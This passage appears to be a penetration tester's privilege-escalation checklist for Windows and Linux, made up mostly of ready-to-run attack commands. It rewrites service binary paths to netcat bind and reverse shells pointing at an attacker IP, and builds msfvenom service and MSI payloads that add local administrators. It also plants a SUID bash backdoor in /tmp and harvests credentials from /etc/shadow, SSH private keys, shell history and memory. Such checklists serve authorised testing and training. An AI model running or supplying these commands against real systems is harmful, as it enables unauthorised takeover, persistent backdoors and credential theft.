  *   [ ] &#x20;Check permissions

      ```
       # using sc
       sc qc <service_name>

       # using accesschk.exe
       accesschk.exe -ucqv <Service_Name>
       accesschk.exe -uwcqv "Authenticated Users" * /accepteula
       accesschk.exe -uwcqv %USERNAME% * /accepteula
       accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
       accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
       
       # using msf
       exploit/windows/local/service_permissions
      ```
  *   [ ] &#x20;Unquoted Service Path

      ```
       wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
       wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services

       for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
       	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
       		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
       	)
       )
       
       gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
       
       # find them using msf 
       exploit/windows/local/trusted_service_path
       
       # generate service binary with msfvenom
       msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
      ```
  *   [ ] &#x20;Change service binary path

      ```
       # if the group "Authenticated users" has SERVICE_ALL_ACCESS
       # it can modify the binary path
       
       # bind shell
       sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
       
       # reverse shell
       sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe <attacker-ip> 4444 -e cmd.exe"
       
       # add user to local admin group
       sc config <Service_Name> binpath= "net localgroup administrators username /add"
       
       # example using SSDPRV
       sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
       
       # then restart the service
       wmic service NAMEOFSERVICE call startservice
       net stop [service name] && net start [service name]
      ```
  *   [ ] &#x20;DLL Hijacking / Overwrite service binary

      ```
       for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

       for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
       
       # do it by using sc
       sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
       FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
       FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
      ```
  *   [ ] &#x20;Registry modify permissions

      ```
       reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

       #Try to write every service with its current content (to check if you have write permissions)
       for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

       get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

       # if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
       # it can be leveraged to change the binary path inside the registry
       reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
      ```
* [ ] &#x20;Installed applications
  *   [ ] &#x20;DLL Hijacking for installed applications

      ```
       dir /a "C:\Program Files"
       dir /a "C:\Program Files (x86)"
       reg query HKEY_LOCAL_MACHINE\SOFTWARE

       Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
       Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
      ```
  *   [ ] &#x20;Write permissions

      ```
       # using accesschk.exe
       accesschk.exe /accepteula
       
       # Find all weak folder permissions per drive.
       accesschk.exe -uwdqs Users c:\
       accesschk.exe -uwdqs "Authenticated Users" c:\
       accesschk.exe -uwdqs "Everyone" c:\
       
       # Find all weak file permissions per drive.
       accesschk.exe -uwqs Users c:\*.*
       accesschk.exe -uwqs "Authenticated Users" c:\*.*
       accesschk.exe -uwdqs "Everyone" c:\*.*
       
       # using icalcs
       icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
       icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
       
       # using Powershell
       Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

       Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
      ```
*   [ ] &#x20;PATH DLL Hijacking

    ```
     # having write permissions inside a folder present ON PATH could bring to DLL hijacking
     for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
    ```
*   [ ] &#x20;AlwaysInstallElevated set in Registry

    ```
     # if both are enabled (set to 0x1), it's possible to execute
     # any .msi as NT AUTHORITY\SYSTEM
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     
     # check with msf
     exploit/windows/local/always_install_elevated
     
     # generate payload with msfvenom
     # no uac format
     msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
     # using the msiexec the uac wont be prompted
     msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
     
     # install .msi
     msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
    ```
*   [ ] &#x20;Scheduled tasks

    ```
     # using schtasks
     schtasks /query /fo LIST /v
     # filtering the output
     schtasks /query /fo LIST /v | findstr /v "\Microsoft"
     
     # using powershell
     Get-ScheduledTask | ft TaskName,TaskPath,State
     # filtering the output
     Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
    ```

    * [ ] &#x20;Executable file writeable
    * [ ] &#x20;Dependency writeable
* [ ] &#x20;Sensitive files readable
  * [ ] &#x20;SAM Hive
  * [ ] &#x20;SYSTEM Hive
*   [ ] &#x20;Windows Subsystem For Linux

    ```
     wsl whoami
     ./ubuntum2004.exe config --default-user root
     wsl whoami
     wsl python -c 'put here your command'
    ```
* [ ] Navigate to the fileystem and look for weird folders that contain weird scripts that run every so often, replace them if we can.&#x20;

#### Linux&#x20;

Principles to becoming root!

1. cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
2. Adding a new user&#x20;
3. Make the user run commands without needing password sudo -l&#x20;

* [ ] Upgrade shell using socat, else python
* [ ] Are we in a dock container? If so this can be seen by doing an ls -la. See how to escape from the notes&#x20;
* [ ] Run linpeas.sh
* [ ] Run SUDO Killer if we have full SSH creds
* [ ] Run SUI3Emum
*   [ ] Go Thru the linpeas.sh output&#x20;

    * [ ] PwnKit? This is an easy win.&#x20;
    * [ ] enumerate users
      * [ ] Look for other users
      * [ ] Try to switch users and rerun enumeration
        * [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)&#x20;
    * [ ] Enumerate groups
      * [ ] Are these exploitable?
      * [ ] lxd
      * [ ] davfs&#x20;
      * [ ] sudo
      * [ ] fail2ban

    Any accessible sensitive file?

    * [ ] &#x20;/etc/passwd
    * [ ] &#x20;/etc/shadow
    * [ ] &#x20;/etc/sudoers
    * [ ] &#x20;Configuration files
    * [ ] &#x20;/root/.ssh/id\_rsa
    * [ ] &#x20;entire root folder
    *   [ ] &#x20;Check env info

        ```
         (env || set) 2>/dev/null
         echo $PATH
        ```
    * [ ] Look through SUID set&#x20;
      * [ ] refer to gtfobins for this
      * [ ] Can we write them?&#x20;
      * [ ] google everything
      * [ ] <mark style="color:red;">LOOK EVEN FOR CUSTOM ONES AND USE THEM!</mark>
        * [ ] Are these missing libraries?&#x20;
          * [ ] Do we have write access to the LD_LIBRARY_PATH? IF yes
          * [ ] Generate our own .so file and paste it in the writable path
    * [ ] Enumerate internal running services&#x20;
      * [ ] If there is a website play with curl
      * [ ] Are these running as other users that we can become?&#x20;
      * [ ] If there is a database running we can enuemrate for credentials to test for UDF&#x20;
        * [ ] mysql  -uroot -pdasdasd
      * [ ] Remote port forward if we have SSH access.&#x20;
    * [ ] Init, init.d systemd Services?
      * [ ] Can we overwrite them?
      * [ ] Can we start or stop the service
      * [ ] Can we reboot the machine?
    * [ ] Check for Cronjobs
      * [ ] Can we overwrite them
      * [ ] Are these missing a library when running?
      * [ ] Can we overwrite the library path
      * [ ] GOOGLE EVERYTHING HERE ,some custom scripts have vulnerable expressions.&#x20;
    * [ ] Password Search&#x20;
      * [ ] &#x20;Try known passwords
      *   [ ] &#x20;Search creds from config files (Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret):

          ```
           grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
           find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
           locate password | more
          ```
      *   [ ] &#x20;Search creds in common files:

          ```
           ls -la /var /var/mail /var/spool/mail
          ```
      * [ ] &#x20;Search creds from local DBs
      *   [ ] &#x20;Search creds from bash history:

          ```
           history
           cat ~/.bash_history
          ```
      *   [ ] &#x20;Search creds from memory:

          ```
           strings /dev/mem -n10 | grep -i PASS
          ```
      *   [ ] &#x20;SSH keys:

          ```
           cat ~/.ssh/id_rsa
           ls ~/.ssh/*
           find / -name authorized_keys 2> /dev/null
           find / -name id_rsa 2> /dev/null
          ```
      *   [ ] &#x20;Search rsync config file

          ```
           find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
          ```
    *   [ ] Transfer Linux Exploit Suggester

        * [ ] Try the most probable exploits


    * [ ] Enumerate processes that run as root and look for weird things.&#x20;
      * [ ] use PSPY
    * [ ] Enumerate the file system and see if there are weird files that we can overwrite&#x20;
      * [ ] check /opt and /srv, expecting to find both empty
      * [ ] you could also try find / -name "\*.py"
      * [ ] Check for weird folders and see if tehre are any bash scripts that we could also modify
      * [ ] python scripts
      * [ ] perl i dont know
